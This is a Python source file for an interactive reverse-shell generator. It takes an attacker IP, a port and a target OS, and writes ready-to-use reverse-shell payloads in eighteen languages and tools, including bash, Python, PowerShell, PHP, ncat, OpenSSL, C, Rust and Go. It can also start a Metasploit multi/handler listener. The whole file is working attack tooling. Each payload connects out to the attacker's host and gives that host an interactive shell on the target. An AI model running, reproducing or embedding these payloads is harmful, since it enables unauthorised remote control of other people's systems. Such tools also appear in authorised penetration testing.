import random
from pyfiglet import Figlet
import sys
from time import sleep
import os
import socket
import subprocess
import platform


class ReverseShellGenerator:
    def __init__(self):
        self.f = Figlet(font='slant')


    def clear_screen(self):
        if platform.system()=="Windows":
            try:
                os.system("cls")
            except:
                pass
        else:
            try:
                os.system("clear")
            except:
                pass

    def typing_print(self, text):
        for character in text:
            sys.stdout.write(character)
            sys.stdout.flush()
            sleep(0.01)

    def typing_input_language(self, text):
        for character in text:
            sys.stdout.write(character)
            sys.stdout.flush()
            sleep(0.05)
        try:
            value = int(input())
        except ValueError:
            print("\n")
            self.typing_print("ERROR! \nPlease Select Only 1 to 18: ")
            value = int(input())
            if value > 21:
                while (value > 18 or value < 0):
                    self.typing_print("ERROR!! \nSelect 1-18: ")
                    value = int(input())
        return value

    def typing_input(self, text):
        for character in text:
            sys.stdout.write(character)
            sys.stdout.flush()
            sleep(0.05)
        value2 = input()
        return value2

    def check_value(self, val,print_output=True,os_v="w"):
        random_num = random.randint(3,9999)
        if val == 1:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : AWK")
                return
            with open(f"awk_shell{random_num}.txt","w") as f:
                f.write(awk)

        if val == 2:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : BASH UDP")
                return
            with open(f"bash_udp_shell{random_num}.txt","w") as f:
                f.write(bash_udp)

        if val == 3:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : C")
                return
            with open(f"c_shell{random_num}.c","w") as f:
                f.write(c)

        if val == 4:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Dart")
                return
            with open(f"dart_shell{random_num}.dart","w") as f:
                f.write(dart)

        if val == 5:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Golang")
                return
            with open(f"go_shell{random_num}.txt","w") as f:
                f.write(golang)

        if val == 6:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Groovy")
                return
            with open(f"groovy_shell{random_num}.txt","w") as f:
                f.write(groovy)

        if val == 7:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Java")
                return
            with open(f"java_shell{random_num}.java","w") as f:
                f.write(java)

        if val == 8:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Lua")
                return
            if os_v=="l":
                with open(f"lua_shell{random_num}.txt","w") as f:
                    f.write(lua_linux)
            else:
                with open(f"lua_shell{random_num}.txt","w") as f:
                    f.write(lua_windows)

        if val == 9:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Ncat")
                return
            with open(f"ncat_shell{random_num}.txt","w") as f:
                f.write(ncat)


        if val == 10:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : NodeJS")
                return
            with open(f"nodejs_shell{random_num}.js","w") as f:
                f.write(nodejs)


        if val == 11:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : OpenSSL")
                return
            with open(f"openssl_shell{random_num}.txt","w") as f:
                f.write(openssl)


        if val == 12:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Perl")
                return
            if os_v == "l":
                with open(f"perl_shell{random_num}.txt","w") as f:
                    f.write(perl_linux)
            else:
                with open(f"perl_shell{random_num}.txt","w") as f:
                    f.write(perl_windows)


        if val == 13:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : PHP")
                return
            with open(f"php_shell{random_num}.txt","w") as f:
                f.write(php)


        if val == 14:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : PowerShell")
                return
            with open(f"powershell_shell{random_num}.txt","w") as f:
                f.write(powershell)

        if val == 15:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Python")
                return
            if os_v == "l":
                with open(f"python_shell{random_num}.txt","w") as f:
                    f.write(python_linux)
            else:
                with open(f"python_shell{random_num}.txt","w") as f:
                    f.write(python_windows)


        if val == 16:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Ruby")
                return
            if os_v == "l":
                with open(f"ruby_shell{random_num}.txt","w") as f:
                    f.write(ruby_linux)
            else:
                with open(f"ruby_shell{random_num}.txt","w") as f:
                    f.write(ruby_windows)


        if val == 17:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Rust")
                return
            with open(f"rust_shell{random_num}.rs","w") as f:
                f.write(rust)


        if val == 18:
            self.clear_screen()
            if print_output:
                self.typing_print("Selected Language : Telnet")
                return
            with open(f"telnet_shell{random_num}.txt","w") as f:
                f.write(telnet)





    def run(self):
        self.clear_screen()

        print(self.f.renderText('REV-SHELL'), flush=True)
        print(self.f.renderText('GENERATOR'), flush=True)

        print(platform.system())
        self.typing_print("author: https://github.com/EymenTakak")

        self.typing_print("""
        
        
        
    1.  AWK
    2.  Bash UDP
    3.  C
    4.  Dart
    5.  Golang
    6.  Groovy
    7.  Java
    8.  Lua
    9.  Ncat
    10. NodeJS
    11. OpenSSL
    12. Perl
    13. PHP
    14. Powershell
    15. Python <3
    16. Ruby
    17. Rust
    18. Telnet
        
        
        
        """)

        type_code = self.typing_input_language("Select Reverse Shell Language(example: 1): ")
        self.check_value(type_code)

        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        self.typing_print(f"\nAttacker Ip: DEFAULT({ip_address}) if you are going to choose this press enter, specific ip: ")
        ip_address = input() or ip_address
        sport = input("\nSelect Listener Port: ")

        self.clear_screen()

        print(f"\nSelected IP address : {ip_address}\n")
        print(f"\nSelected Port : {sport}\n\n")

        self.typing_print(f"Select Target OS: Windows(W) or Linux(L): ")
        selected_os = input()
        print("\n")
        if (selected_os.lower() != "w") and (selected_os.lower() != "l"):
            selected_os = "w"
            self.typing_print("Wrong Choose! Selection changed To 'Windows'\n")
        else:
            if selected_os.lower() == "w":
                self.typing_print("Selected OS: Windows\n")
            else:
                self.typing_print("Selected OS: Linux\n")

        if platform.system()!="Windows":
            self.typing_print("\n Do You Want To Open The Multihandler After The File Is Created?? (Y/N): ")
            selected_listener = input()
        else:
            selected_listener = "n"

        if (selected_listener.lower() != "n") and (selected_listener.lower() != "y"):
            selected_listener = "n"
            self.typing_print("\nWrong Choose! Selection changed To 'No'")


        self.clear_screen()


        self.typing_print(f"\nSelected IP address : {ip_address}\n")
        self.typing_print(f"Selected Port : {sport}\n")
        if selected_os.lower() == "w":
            self.typing_print("Selected OS: Windows\n")
        else:
            self.typing_print("Selected OS: Linux\n")
        if selected_listener.lower() == "y":
            self.typing_print("Listener Mode: Yes\n")
        else:
            self.typing_print("Listener Mode: No\n")



        global bash_udp,perl_linux,perl_windows,python_linux,python_windows,php,ruby_linux,ruby_windows,rust,golang,ncat,openssl,powershell,awk,java,telnet,lua_linux,lua_windows,nodejs,groovy,c,dart
        bash_udp = f"sh -i >& /dev/udp/{ip_address}/{sport} 0>&1"

        perl_linux = f"""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip_address}:{sport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
        perl_windows = f"""perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{ip_address}:{sport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""

        python_linux = f"""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip_address}",{sport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""
        python_windows = f"""python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('{ip_address}',{sport}));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()" """

        php = f"""php -r '$sock=fsockopen("{ip_address}",{sport});shell_exec("/bin/sh -i <&3 >&3 2>&3");'"""

        ruby_linux = f"""ruby -rsocket -e'f=TCPSocket.open("{ip_address}",{sport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
        ruby_windows = """ruby -rsocket -e 'c=TCPSocket.new("%s","%s");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'""" % (
        ip_address, sport)

        rust = """
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("%s:%s").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
        """ % (ip_address, sport)

        golang = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%s");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""" % (
        ip_address, sport)

        ncat = f"""ncat {ip_address} {sport} -e /bin/bash"""

        openssl = f"""mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip_address}:{sport} > /tmp/s; rm /tmp/s"""



        awk = """awk 'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null""" % (
        ip_address, sport)

        java = f"""
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{ip_address}/{sport};cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
        """

        telnet = f"""telnet {ip_address} {sport} | /bin/sh | {ip_address} {sport} """

        lua_linux = f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip_address}','{sport}');os.execute('/bin/sh -i <&3 >&3 2>&3');"""
        lua_windows = f"""lua5.1 -e 'local host, port = "{ip_address}", {sport} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'"""

        nodejs = f"""
-var x = global.process.mainModule.require
-x('child_process').exec('nc {ip_address} {sport} -e /bin/bash')
        """

        powershell = f"""$callback = New-Object System.Net.Sockets.TCPClient("{ip_address}",{sport});$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$callback.Close()"""

        groovy = """
String host="%s";
int port=%s;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""" % (
        ip_address, sport)

        c = """
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = %s;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("%s");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
        """ % (ip_address, sport)

        dart = """
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("%s", %s).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
        """ % (ip_address, sport)

        self.check_value(type_code, print_output=False, os_v=selected_os)

        msfconsole_command = "msfconsole"
        command_file = "msf_commands.rc"

        multi_handler_commands = f"""
        use exploit/multi/handler
        set LHOST {ip_address}
        set LPORT {sport}
        run
        """


        if selected_listener.lower() == "y":
            with open(command_file, "w") as f:
                f.write(multi_handler_commands)
            command = f"{msfconsole_command} -r {command_file}"
            subprocess.Popen(command, shell=True)
        else:
            print("successfully created")

if __name__ == "__main__":
    reverse_shell_generator = ReverseShellGenerator()
    reverse_shell_generator.run()
